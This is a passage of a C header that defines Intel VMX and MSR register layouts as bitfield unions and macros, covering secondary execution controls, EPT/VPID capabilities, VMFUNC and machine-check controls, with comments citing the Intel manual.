#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_FLAG 0x02
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_EPT(_) (((_) >> 1) & 0x01)

    /**
     * @brief Descriptor table instructions cause VM-exits
     *
     * [Bit 2] This control determines whether executions of LGDT, LIDT, LLDT, LTR, SGDT, SIDT,
     * SLDT, and STR cause VM exits.
     */
    UINT64 DescriptorTableExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_BIT 2
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_FLAG 0x04
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_DESCRIPTOR_TABLE_EXITING(_) (((_) >> 2) & 0x01)

    /**
     * @brief RDTSCP supported/enabled
     *
     * [Bit 3] If this control is 0, any execution of RDTSCP causes an invalid-opcode exception
     * (\#UD).
     */
    UINT64 EnableRdtscp : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_BIT 3
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_FLAG 0x08
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_RDTSCP(_) (((_) >> 3) & 0x01)

    /**
     * @brief Virtualize x2APIC mode
     *
     * [Bit 4] If this control is 1, the logical processor treats specially RDMSR and WRMSR to APIC
     * MSRs (in the range 800H-8FFH).
     *
     * @see Vol3C[29.5(VIRTUALIZING MSR-BASED APIC ACCESSES)]
     */
    UINT64 VirtualizeX2ApicMode : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_BIT 4
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_FLAG 0x10
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUALIZE_X2APIC_MODE(_) (((_) >> 4) & 0x01)

    /**
     * @brief VPID supported/enabled
     *
     * [Bit 5] If this control is 1, cached translations of linear addresses are associated with a
     * virtualprocessor identifier (VPID).
     *
     * @see Vol3C[28.1(VIRTUAL PROCESSOR IDENTIFIERS (VPIDS))]
     */
    UINT64 EnableVpid : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_BIT 5
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_FLAG 0x20
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VPID(_) (((_) >> 5) & 0x01)

    /**
     * @brief VM-exit when executing the WBINVD instruction
     *
     * [Bit 6] This control determines whether executions of WBINVD cause VM exits.
     */
    UINT64 WbinvdExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_BIT 6
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_FLAG 0x40
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_WBINVD_EXITING(_) (((_) >> 6) & 0x01)

    /**
     * @brief Unrestricted guest execution
     *
     * [Bit 7] This control determines whether guest software may run in unpaged protected mode or
     * in realaddress mode.
     */
    UINT64 UnrestrictedGuest : 1;
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_BIT 7
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_FLAG 0x80
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_UNRESTRICTED_GUEST(_) (((_) >> 7) & 0x01)

    /**
     * @brief APIC register virtualization
     *
     * [Bit 8] If this control is 1, the logical processor virtualizes certain APIC accesses.
     *
     * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
     * @see Vol3C[29.5(VIRTUALIZING MSR-BASED APIC ACCESSES)]
     */
    UINT64 ApicRegisterVirtualization : 1;
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_BIT 8
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_FLAG 0x100
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_APIC_REGISTER_VIRTUALIZATION(_) (((_) >> 8) & 0x01)

    /**
     * @brief Virtual-interrupt delivery
     *
     * [Bit 9] This controls enables the evaluation and delivery of pending virtual interrupts as
     * well as the emulation of writes to the APIC registers that control interrupt prioritization.
     */
    UINT64 VirtualInterruptDelivery : 1;
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_BIT 9
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_FLAG 0x200
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_VIRTUAL_INTERRUPT_DELIVERY(_) (((_) >> 9) & 0x01)

    /**
     * @brief A specified number of pause loops cause a VM-exit
     *
     * [Bit 10] This control determines whether a series of executions of PAUSE can cause a VM exit.
     *
     * @see Vol3C[24.6.13(Controls for PAUSE-Loop Exiting)]
     * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
     */
    UINT64 PauseLoopExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_BIT 10
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_FLAG 0x400
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_PAUSE_LOOP_EXITING(_) (((_) >> 10) & 0x01)

    /**
     * @brief VM-exit when executing RDRAND instructions
     *
     * [Bit 11] This control determines whether executions of RDRAND cause VM exits.
     */
    UINT64 RdrandExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_BIT 11
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_FLAG 0x800
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_RDRAND_EXITING(_) (((_) >> 11) & 0x01)

    /**
     * @brief Enables INVPCID instructions
     *
     * [Bit 12] If this control is 0, any execution of INVPCID causes a \#UD.
     */
    UINT64 EnableInvpcid : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_BIT 12
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_FLAG 0x1000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_INVPCID(_) (((_) >> 12) & 0x01)

    /**
     * @brief Enables VMFUNC instructions
     *
     * [Bit 13] Setting this control to 1 enables use of the VMFUNC instruction in VMX non-root
     * operation.
     *
     * @see Vol3C[25.5.5(VM Functions)]
     */
    UINT64 EnableVmFunctions : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_BIT 13
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_FLAG 0x2000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_VM_FUNCTIONS(_) (((_) >> 13) & 0x01)

    /**
     * @brief Enables VMCS shadowing
     *
     * [Bit 14] If this control is 1, executions of VMREAD and VMWRITE in VMX non-root operation may
     * access a shadow VMCS (instead of causing VM exits).
     *
     * @see {'Vol3C[24.10(VMCS TYPES': 'ORDINARY AND SHADOW)]'}
     * @see Vol3C[30.3(VMX INSTRUCTIONS)]
     */
    UINT64 VmcsShadowing : 1;
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_BIT 14
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_FLAG 0x4000
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_VMCS_SHADOWING(_) (((_) >> 14) & 0x01)

    /**
     * @brief Enables ENCLS VM-exits
     *
     * [Bit 15] If this control is 1, executions of ENCLS consult the ENCLS-exiting bitmap to
     * determine whether the instruction causes a VM exit.
     *
     * @see Vol3C[24.6.16(ENCLS-Exiting Bitmap)]
     * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
     */
    UINT64 EnableEnclsExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_BIT 15
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_FLAG 0x8000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_ENCLS_EXITING(_) (((_) >> 15) & 0x01)

    /**
     * @brief VM-exit when executing RDSEED
     *
     * [Bit 16] This control determines whether executions of RDSEED cause VM exits.
     */
    UINT64 RdseedExiting : 1;
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_BIT 16
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_FLAG 0x10000
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_RDSEED_EXITING(_) (((_) >> 16) & 0x01)

    /**
     * @brief Enables page-modification logging
     *
     * [Bit 17] If this control is 1, an access to a guest-physical address that sets an EPT dirty
     * bit first adds an entry to the page-modification log.
     *
     * @see Vol3C[28.2.5(Page-Modification Logging)]
     */
    UINT64 EnablePml : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_BIT 17
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_FLAG 0x20000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_PML(_) (((_) >> 17) & 0x01)

    /**
     * @brief Controls whether EPT-violations may cause
     *
     * [Bit 18] If this control is 1, EPT violations may cause virtualization exceptions (\#VE)
     * instead of VM exits.
     *
     * @see Vol3C[25.5.6(Virtualization Exceptions)]
     */
    UINT64 EptViolation : 1;
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_BIT 18
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_FLAG 0x40000
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_EPT_VIOLATION(_) (((_) >> 18) & 0x01)

    /**
     * @brief Conceal VMX non-root operation from Intel processor trace (PT)
     *
     * [Bit 19] If this control is 1, Intel Processor Trace suppresses from PIPs an indication that
     * the processor was in VMX non-root operation and omits a VMCS packet from any PSB+ produced in
     * VMX nonroot operation.
     *
     * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
     */
    UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_BIT 19
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_FLAG 0x80000
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_CONCEAL_VMX_FROM_PT(_) (((_) >> 19) & 0x01)

    /**
     * @brief Enables XSAVES/XRSTORS instructions
     *
     * [Bit 20] If this control is 0, any execution of XSAVES or XRSTORS causes a \#UD.
     */
    UINT64 EnableXsaves : 1;
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_BIT 20
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_FLAG 0x100000
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_ENABLE_XSAVES(_) (((_) >> 20) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 22] If this control is 1, EPT execute permissions are based on whether the linear
     * address being accessed is supervisor mode or user mode.
     *
     * @see Vol3C[28(VMX SUPPORT FOR ADDRESS TRANSLATION)]
     */
    UINT64 ModeBasedExecuteControlForEpt : 1;
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_BIT 22
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_FLAG 0x400000
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT(_) (((_) >> 22) & 0x01)
    UINT64 Reserved2 : 2;

    /**
     * @brief Use TSC scaling
     *
     * [Bit 25] This control determines whether executions of RDTSC, executions of RDTSCP, and
     * executions of RDMSR that read from the IA32_TIME_STAMP_COUNTER MSR return a value modified by
     * the TSC multiplier field.
     *
     * @see Vol3C[24.6.5(Time-Stamp Counter Offset and Multiplier)]
     * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
     */
    UINT64 UseTscScaling : 1;
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_BIT 25
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_FLAG 0x2000000
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_MASK 0x01
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING(_) (((_) >> 25) & 0x01)
    UINT64 Reserved3 : 38;
  };

  UINT64 Flags;
} IA32_VMX_PROCBASED_CTLS2_REGISTER;

/**
 * Capability Reporting Register of EPT and VPID.
 *
 * @remarks If ( CPUID.01H:ECX.[5] && IA32_VMX_PROCBASED_CTLS[63] && (IA32_VMX_PROCBASED_CTLS2[33]
 * || IA32_VMX_PROCBASED_CTLS2[37]) )
 * @see Vol3D[A.10(VPID AND EPT CAPABILITIES)]
 * @see Vol3D[A.10(VPID and EPT Capabilities)] (reference)
 */
#define IA32_VMX_EPT_VPID_CAP 0x0000048C
typedef union {
  struct {
    /**
     * [Bit 0] When set to 1, the processor supports execute-only translations by EPT. This support
     * allows software to configure EPT paging-structure entries in which bits 1:0 are clear
     * (indicating that data accesses are not allowed) and bit 2 is set (indicating that instruction
     * fetches are allowed).
     */
    UINT64 ExecuteOnlyPages : 1;
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_BIT 0
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_FLAG 0x01
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * [Bit 6] Indicates support for a page-walk length of 4.
     */
    UINT64 PageWalkLength4 : 1;
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_BIT 6
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_FLAG 0x40
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4(_) (((_) >> 6) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 8] When set to 1, the logical processor allows software to configure the EPT
     * paging-structure memory type to be uncacheable (UC).
     *
     * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP))]
     */
    UINT64 MemoryTypeUncacheable : 1;
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_BIT 8
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_FLAG 0x100
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE(_) (((_) >> 8) & 0x01)
    UINT64 Reserved3 : 5;

    /**
     * [Bit 14] When set to 1, the logical processor allows software to configure the EPT
     * paging-structure memory type to be write-back (WB).
     */
    UINT64 MemoryTypeWriteBack : 1;
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_BIT 14
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_FLAG 0x4000
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK(_) (((_) >> 14) & 0x01)
    UINT64 Reserved4 : 1;

    /**
     * [Bit 16] When set to 1, the logical processor allows software to configure a EPT PDE to map a
     * 2-Mbyte page (by setting bit 7 in the EPT PDE).
     */
    UINT64 Pde2MbPages : 1;
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_BIT 16
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_FLAG 0x10000
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES(_) (((_) >> 16) & 0x01)

    /**
     * [Bit 17] When set to 1, the logical processor allows software to configure a EPT PDPTE to map
     * a 1-Gbyte page (by setting bit 7 in the EPT PDPTE).
     */
    UINT64 Pdpte1GbPages : 1;
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_BIT 17
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_FLAG 0x20000
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES(_) (((_) >> 17) & 0x01)
    UINT64 Reserved5 : 2;

    /**
     * [Bit 20] If bit 20 is read as 1, the INVEPT instruction is supported.
     *
     * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
     * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
     */
    UINT64 Invept : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_BIT 20
#define IA32_VMX_EPT_VPID_CAP_INVEPT_FLAG 0x100000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT(_) (((_) >> 20) & 0x01)

    /**
     * [Bit 21] When set to 1, accessed and dirty flags for EPT are supported.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 EptAccessedAndDirtyFlags : 1;
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_BIT 21
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_FLAG 0x200000
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS(_) (((_) >> 21) & 0x01)

    /**
     * [Bit 22] When set to 1, the processor reports advanced VM-exit information for EPT
     * violations. This reporting is done only if this bit is read as 1.
     *
     * @see Vol3C[27.2.1(Basic VM-Exit Information)]
     */
    UINT64 AdvancedVmexitEptViolationsInformation : 1;
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_BIT 22
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_FLAG 0x400000
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION(_) (((_) >> 22) & 0x01)
    UINT64 Reserved6 : 2;

    /**
     * [Bit 25] When set to 1, the single-context INVEPT type is supported.
     *
     * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
     * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
     */
    UINT64 InveptSingleContext : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_BIT 25
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_FLAG 0x2000000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT(_) (((_) >> 25) & 0x01)

    /**
     * [Bit 26] When set to 1, the all-context INVEPT type is supported.
     *
     * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
     * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
     */
    UINT64 InveptAllContexts : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_BIT 26
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_FLAG 0x4000000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS(_) (((_) >> 26) & 0x01)
    UINT64 Reserved7 : 5;

    /**
     * [Bit 32] When set to 1, the INVVPID instruction is supported.
     */
    UINT64 Invvpid : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_BIT 32
#define IA32_VMX_EPT_VPID_CAP_INVVPID_FLAG 0x100000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID(_) (((_) >> 32) & 0x01)
    UINT64 Reserved8 : 7;

    /**
     * [Bit 40] When set to 1, the individual-address INVVPID type is supported.
     */
    UINT64 InvvpidIndividualAddress : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_BIT 40
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_FLAG 0x10000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS(_) (((_) >> 40) & 0x01)

    /**
     * [Bit 41] When set to 1, the single-context INVVPID type is supported.
     */
    UINT64 InvvpidSingleContext : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_BIT 41
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_FLAG 0x20000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT(_) (((_) >> 41) & 0x01)

    /**
     * [Bit 42] When set to 1, the all-context INVVPID type is supported.
     */
    UINT64 InvvpidAllContexts : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_BIT 42
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_FLAG 0x40000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS(_) (((_) >> 42) & 0x01)

    /**
     * [Bit 43] When set to 1, the single-context-retaining-globals INVVPID type is supported.
     */
    UINT64 InvvpidSingleContextRetainGlobals : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_BIT 43
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_FLAG 0x80000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS(_) (((_) >> 43) & 0x01)
    UINT64 Reserved9 : 20;
  };

  UINT64 Flags;
} IA32_VMX_EPT_VPID_CAP_REGISTER;

/**
 * @defgroup IA32_VMX_TRUE_CTLS \
 *           IA32_VMX_TRUE_(x)_CTLS
 *
 * Capability Reporting Register of Pin-Based VM-Execution Flex Controls, Primary Processor-Based
 * VM-Execution Flex Controls, VM-Exit Flex Controls and VM-Entry Flex Controls.
 *
 * @remarks If ( CPUID.01H:ECX.[5] = 1 && IA32_VMX_BASIC[55] )
 * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
 * @see Vol3D[A.4(VM-EXIT CONTROLS)]
 * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
 * @see Vol3D[A.3.1(Pin-Based VMExecution Controls)] (reference)
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)] (reference)
 * @see Vol3D[A.4(VM-Exit Controls)] (reference)
 * @see Vol3D[A.5(VM-Entry Controls)] (reference)
 * @{
 */
#define IA32_VMX_TRUE_PINBASED_CTLS 0x0000048D
#define IA32_VMX_TRUE_PROCBASED_CTLS 0x0000048E
#define IA32_VMX_TRUE_EXIT_CTLS 0x0000048F
#define IA32_VMX_TRUE_ENTRY_CTLS 0x00000490
typedef union {
  struct {
    /**
     * [Bits 31:0] Indicate the allowed 0-settings of these controls. VM entry allows control X to
     * be 0 if bit X in the MSR is cleared to 0; if bit X in the MSR is set to 1, VM entry fails if
     * control X is 0.
     */
    UINT64 Allowed0Settings : 32;
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_BIT 0
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_FLAG 0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_MASK 0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * [Bits 63:32] Indicate the allowed 1-settings of these controls. VM entry allows control X to
     * be 1 if bit 32+X in the MSR is set to 1; if bit 32+X in the MSR is cleared to 0, VM entry
     * fails if control X is 1.
     */
    UINT64 Allowed1Settings : 32;
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_BIT 32
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_FLAG 0xFFFFFFFF00000000
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_MASK 0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_VMX_TRUE_CTLS_REGISTER;

/**
 * @}
 */

/**
 * Capability Reporting Register of VMFunction Controls.
 *
 * @remarks If ( CPUID.01H:ECX.[5] = 1 && IA32_VMX_BASIC[55] )
 * @see Vol3D[A.11(VM FUNCTIONS)]
 * @see Vol3D[24.6.14(VM-Function Controls)] (reference)
 */
#define IA32_VMX_VMFUNC 0x00000491
typedef union {
  struct {
    /**
     * [Bit 0] The EPTP-switching VM function changes the EPT pointer to a value chosen from the
     * EPTP list.
     *
     * @see Vol3C[25.5.5.3(EPTP Switching)]
     */
    UINT64 EptpSwitching : 1;
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_BIT 0
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_FLAG 0x01
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_MASK 0x01
#define IA32_VMX_VMFUNC_EPTP_SWITCHING(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_VMX_VMFUNC_REGISTER;

/**
 * @defgroup IA32_A_PMC \
 *           IA32_A_PMC(n)
 *
 * Full Width Writable IA32_PMC(n) Alias.
 *
 * @remarks (If CPUID.0AH: EAX[15:8] > 0) && IA32_PERF_CAPABILITIES[13] = 1
 * @{
 */
#define IA32_A_PMC0 0x000004C1
#define IA32_A_PMC1 0x000004C2
#define IA32_A_PMC2 0x000004C3
#define IA32_A_PMC3 0x000004C4
#define IA32_A_PMC4 0x000004C5
#define IA32_A_PMC5 0x000004C6
#define IA32_A_PMC6 0x000004C7
#define IA32_A_PMC7 0x000004C8
/**
 * @}
 */

/**
 * Allows software to signal some MCEs to only a single logical processor in the system.
 *
 * @remarks If IA32_MCG_CAP.LMCE_P = 1
 * @see Vol3B[15.3.1.4(IA32_MCG_EXT_CTL MSR)]
 */
#define IA32_MCG_EXT_CTL 0x000004D0
typedef union {
  struct {
    UINT64 LmceEn : 1;
#define IA32_MCG_EXT_CTL_LMCE_EN_BIT 0
#define IA32_MCG_EXT_CTL_LMCE_EN_FLAG 0x01
#define IA32_MCG_EXT_CTL_LMCE_EN_MASK 0x01
#define IA32_MCG_EXT_CTL_LMCE_EN(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_MCG_EXT_CTL_REGISTER;

/**
 * @brief Status and SVN Threshold of SGX Support for ACM <b>(RO)</b>
 *
 * Intel SGX only allows launching ACMs with an Intel SGX SVN that is at the same level or higher
 * than the expected Intel SGX SVN. The expected Intel SGX SVN is specified by BIOS and locked down
 * by the processor on the first successful execution of an Intel SGX instruction that doesn't
 * return an error code. Intel SGX provides interfaces for system software to discover whether a non
